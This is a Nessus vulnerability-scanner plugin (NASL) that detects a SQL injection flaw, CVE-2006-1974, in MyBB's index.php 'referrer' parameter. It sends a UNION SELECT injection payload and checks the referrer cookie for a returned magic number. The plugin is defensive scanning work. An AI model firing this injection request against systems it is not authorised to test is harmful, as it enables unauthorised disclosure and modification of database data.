#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20838);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2015/05/22 19:48:53 $");

  script_cve_id("CVE-2006-1974");
  script_bugtraq_id(16443);
  script_osvdb_id(25672);

  script_name(english:"MyBB index.php 'referrer' Parameter SQLi");
  script_summary(english:"Checks for referrer parameter SQL injection vulnerability in MyBB.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of MyBB installed on the remote host is affected by a SQL
injection vulnerability due to improper sanitization of user-supplied
input to the 'referrer' parameter before using it in the globals.php
script. A remote attacker can exploit this issue to manipulate SQL
queries, resulting in the disclosure of sensitive information and
modification of data.");
  script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=6777");
  script_set_attribute(attribute:"solution", value:
"Upgrade to MyBB version 1.0.4 or later. Alternatively, edit
inc/settings.php and set 'usereferrals' to 'no'");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2006/01/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/02/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mybb:mybb");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/MyBB");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "MyBB";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

magic = rand();
exploit = "UNION SELECT " + magic + ",2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9--";

init_cookiejar();

val = get_http_cookie(name: "mybb[referrer]");
if (val == magic) clear_cookiejar();

# Try to exploit flaw.
url = "/index.php?referrer=" + rand() % 100 + "'+" + urlencode(str:exploit);
r = http_send_recv3(
  method : "GET",
  item   : dir + url,
  port   : port,
  exit_on_fail : TRUE
);

# There's a problem if we see our magic number in the referrer cookie.
val = get_http_cookie(name: "mybb[referrer]");
if (val == magic)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,
    request    : make_list(http_last_sent_request()),
    output     : chomp(val),
    rep_extra  : '\nNote that Nessus confirmed this issue by examining the HTTP referrer cookie value'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
